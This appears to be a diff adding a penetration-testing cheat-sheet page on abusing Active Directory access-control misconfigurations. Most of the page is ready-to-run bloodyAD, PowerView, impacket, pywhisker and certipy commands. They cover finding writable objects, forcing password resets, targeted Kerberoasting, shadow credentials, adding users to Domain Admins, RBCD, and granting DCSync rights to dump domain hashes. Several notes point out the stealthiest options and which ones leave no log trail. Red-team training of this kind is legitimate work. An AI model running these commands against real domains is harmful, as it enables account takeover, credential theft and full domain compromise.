@@ -1,0 +1,215 @@
+# ACL Abuse
+
+Active Directory objects have Access Control Lists that define who can read or modify them. Misconfigured ACEs on user, group, computer, or domain objects are a reliable path to privilege escalation: often set by admins who don't understand the implications of "GenericAll".
+
+## Finding Misconfigs
+
+Start with BloodHound's graph, then sweep with PowerView and bloodyAD to catch what BloodHound misses on granular attributes.
+
+```bash
+# BloodHound: graph query
+# "Find Principals with Dangerous Rights" → shows GenericAll, WriteDACL, etc.
+# On owned nodes: right-click → "Outbound Object Control"
+
+# bloodyAD: writable objects from Linux
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype ALL
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype USER
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype COMPUTER
+```
+
+```powershell
+# PowerView: find all interesting ACEs
+Import-Module .\PowerView.ps1
+
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+    $_.IdentityReferenceName -match "your.user|YourGroup"
+}
+
+# Check ACEs on a specific object
+Get-ObjectAcl -Identity "CN=target,CN=Users,DC=domain,DC=local" -ResolveGUIDs |
+  Select-Object SecurityIdentifier, ActiveDirectoryRights, AceType
+
+# DCSync rights specifically
+Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | Where-Object {
+    $_.ObjectAceType -match "DS-Replication"
+}
+```
+
+## ACL Attack Map
+
+| Right | Object Type | Attack |
+|-------|-------------|--------|
+| `GenericAll` | User | Password reset, targeted Kerberoast, shadow credentials |
+| `GenericAll` | Group | Add yourself or any account as member |
+| `GenericAll` | Computer | RBCD (set msDS-AllowedToActOnBehalfOfOtherIdentity) |
+| `GenericWrite` | User | Targeted Kerberoast (set SPN), shadow creds (msDS-KeyCredentialLink) |
+| `GenericWrite` | Computer | RBCD (set msDS-AllowedToActOnBehalfOfOtherIdentity) |
+| `WriteDACL` | Any | Grant yourself GenericAll or DCSync rights |
+| `WriteOwner` | Any | Take ownership → then WriteDACL |
+| `ForceChangePassword` | User | Reset password without knowing current |
+| `WriteProperty (msDS-KeyCredentialLink)` | User / Computer | Shadow credentials → PKINIT |
+| `CreateChild` | OU | BadSuccessor: dMSA escalation (WS2025) |
+| `DS-Replication-Get-Changes[-All]` | Domain | DCSync |
+
+## GenericAll on User
+
+Full control over the object: three viable exploitation paths depending on what's noisiest or most reliable.
+
+```bash
+# Option 1: Password reset (loudest, triggers password change event)
+net rpc password $TARGET 'NewPass123!' -U $DOMAIN/$USER%$PASSWORD -S $DC_IP
+
+# Option 2: Targeted Kerberoast (see also Kerberoasting page)
+Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname='fake/spn'}
+GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP -request-user $TARGET
+Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
+```
+
+```bash
+# Option 3: Shadow Credentials (stealthiest: no password change)
+pywhisker -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET --action add --dc-ip $IP
+certipy shadow auto -u $USER@$DOMAIN -p $PASSWORD -account $TARGET -dc-ip $IP
+```
+
+## GenericAll on Group
+
+Add any account to the group directly: domain admin group membership being the obvious endgame.
+
+```powershell
+# PowerView
+Add-DomainGroupMember -Identity "Domain Admins" -Members "$USER"
+
+# net command
+net group "Domain Admins" $USER /add /domain
+```
+
+```bash
+# bloodyAD from Linux
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST add groupMember "Domain Admins" $USER
+```
+
+## GenericAll on Computer → RBCD
+
+Set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer to configure Resource-Based Constrained Delegation. Full attack chain is in [Delegation → RBCD](./delegation#rbcd-resource-based-constrained-delegation).
+
+```bash
+# bloodyAD: set RBCD attribute on target computer
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object TARGET$ msDS-AllowedToActOnBehalfOfOtherIdentity -v 'ATTACKER_COMPUTER$'
+```
+
+## GenericWrite on User
+
+Can't reset the password directly, but can modify writable attributes: SPN for Kerberoasting or msDS-KeyCredentialLink for shadow creds.
+
+```powershell
+# Targeted Kerberoast via SPN manipulation
+Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN"}
+```
+
+```bash
+GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP -request-user $TARGET
+```
+
+```powershell
+Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
+```
+
+```bash
+# Shadow Credentials via msDS-KeyCredentialLink
+pywhisker -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET --action add --dc-ip $IP
+```
+
+## GenericWrite on Computer → RBCD
+
+Same as GenericAll on Computer: set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target.
+
+```bash
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object TARGET$ msDS-AllowedToActOnBehalfOfOtherIdentity -v 'ATTACKER_COMPUTER$'
+```
+
+## WriteDACL
+
+Rewrite the DACL on the target object: grant yourself GenericAll or DCSync rights and escalate from there.
+
+```bash
+# Grant GenericAll on a user
+dacledit.py -action write -rights FullControl \
+  -principal $USER -target $TARGET \
+  $DOMAIN/$USER:$PASSWORD -dc-ip $IP
+
+# Grant DCSync rights on the domain object
+dacledit.py -action write -rights DCSync \
+  -principal $USER -target-dn "DC=$DOMAIN,DC=local" \
+  $DOMAIN/$USER:$PASSWORD -dc-ip $IP
+
+# Then run DCSync
+secretsdump.py $DOMAIN/$USER:$PASSWORD@$DC_IP
+```
+
+```powershell
+# PowerView alternative
+Add-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
+Add-DomainObjectAcl -TargetIdentity "DC=$DOMAIN,DC=local" -PrincipalIdentity $USER -Rights DCSync
+```
+
+## WriteOwner
+
+Take ownership of the object first, then use that ownership to grant yourself WriteDACL: from there, escalate as above.
+
+```powershell
+# Step 1: Take ownership
+Set-DomainObjectOwner -Identity $TARGET -OwnerIdentity $USER
+
+# Step 2: Grant yourself WriteDACL now that you own it
+Add-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights WriteDacl
+
+# Step 3: Grant GenericAll
+Add-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
+```
+
+## ForceChangePassword
+
+Reset the target user's password without knowing the current one: useful when you need access to the account but don't want to enumerate further.
+
+```bash
+# Linux: net rpc
+net rpc password $TARGET 'NewPass123!' -U $DOMAIN/$USER%$PASSWORD -S $DC_IP
+
+# impacket
+changepasswd.py $DOMAIN/$TARGET@$DC_IP -newpass 'NewPass123!' -newhashes :
+```
+
+```powershell
+# PowerView
+$newpass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity $TARGET -AccountPassword $newpass
+
+# rpcclient
+rpcclient -U '$DOMAIN\$USER%$PASSWORD' $DC_IP
+setuserinfo2 $TARGET 23 'NewPass123!'
+```
+
+## WriteProperty on msDS-KeyCredentialLink → Shadow Credentials
+
+Add a certificate key credential to the target account: authenticates via PKINIT without changing the password, leaving no obvious event log trail.
+
+```bash
+# pywhisker: add shadow credential
+pywhisker -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET --action add --dc-ip $IP
+# Outputs: PFX file path + PFX password
+
+# Authenticate with the certificate → get NT hash
+certipy auth -pfx $TARGET.pfx -dc-ip $IP
+
+# Or get TGT
+getTGT.py $DOMAIN/$TARGET -pfx-base64 $B64 -dc-ip $IP
+export KRB5CCNAME=$TARGET.ccache
+```
+
+```powershell
+# Whisker (Windows)
+.\Whisker.exe add /target:$TARGET /domain:$DOMAIN /dc:$DC_HOST
+# Outputs: Rubeus command to authenticate with the generated certificate
+```
